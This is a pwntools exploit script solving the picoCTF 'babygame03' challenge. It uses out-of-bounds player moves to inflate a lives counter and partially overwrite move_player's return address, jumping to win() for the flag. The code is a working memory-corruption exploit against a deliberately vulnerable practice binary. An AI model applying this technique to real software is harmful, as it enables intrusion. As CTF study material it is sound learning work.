# picoCTF-babygame03-exploit.py
# by Aidan Wech (ahwech)
# nc rhea.picoctf.net xxxxx

from pwn import *

# globals
start_x_coord = 4
start_y_coord = 4

# increase_lives_payload: manipulates lives value to grant the player 77 million lives by adding 0x2e000000 to lives
def increase_lives_payload():
    lives_x_coord = -4
    lives_y_coord = -1
    payload = flat(
        "a" * (start_x_coord - lives_x_coord),      # moves player to [-4, 4]
        "w" * (start_y_coord - lives_y_coord - 1),  # moves player to [-4, -1]
        "s",                                        # +77 million lives!!!
        "d" * (0 - lives_x_coord)                   # moves back in bounds
    )

    return payload

# change_move_player_ret_addr_payload: manipulates the last byte of the move_player return address with a chosen byte
#                                      in order to change where to return to in main
def change_move_player_ret_addr_payload(char: int):
    move_player_ret_addr_x_coord = 39
    payload = flat(
        increase_lives_payload(),               # grant the player more lives to work with
        b"d" * move_player_ret_addr_x_coord,    # move the player over to move_player return address' x-coord
        b"l",
        p8(char),                               # change player character to the chosen byte
        b"ww"                                   # overwrite return address
    )

    return payload

def main():
    # connection variables (remember to start up instance on picoCTF, port will vary!)
    host = "rhea.picoctf.net"
    port = 60445

    # connect to instance
    p = remote(host, port)

    # play_game: obtain more lives, then automatically solve puzzle when back in bounds
    def play_game():
        with context.silent:
            p.recvuntil(b"X\n", timeout=1)
            p.sendline(increase_lives_payload() + b"p")
            p.recvuntil(b"starting \n", timeout=3)
        return
    
    # play_game until game = 4, win = 3
    for i in range(3):
        play_game()

    with context.silent:
        p.recvuntil(b"X\n", timeout=1)

        # with game = 4, we will never reach the check to increase win and game by normal means
        # therefore, we need to change move_player's return address to completely bypass the check
        # in this case, change_move_player_ret_addr_payload(0x7f) changes move_player's return address to main+270 (I chose this for stack pointer alignment reasons)
        p.sendline(change_move_player_ret_addr_payload(0x7f))
        p.recvuntil(b"X\n", timeout=1)

        # now game = 5 and win = 4, but uh oh! if we reach the treasure, then game = 6 and win = 5 and we wont reach win!
        # instead, we overwrite move_player's return address again
        # change_move_player_ret_addr_payload(0xe5) will bring us to main+372, as we don't want to check that x = 89 and y = 29
        # this will allow us to pass the check and go to win()!
        p.sendline(change_move_player_ret_addr_payload(0xe5))
        p.recvuntil(b"X\n", timeout=1)
    
    # obtain flag
    flag = "picoCTF" + p.recvall(timeout=3).split(b"picoCTF")[1].decode()
    p.close()

    # print flag
    log.info(f"flag: {flag}")

if __name__ == "__main__":
    main()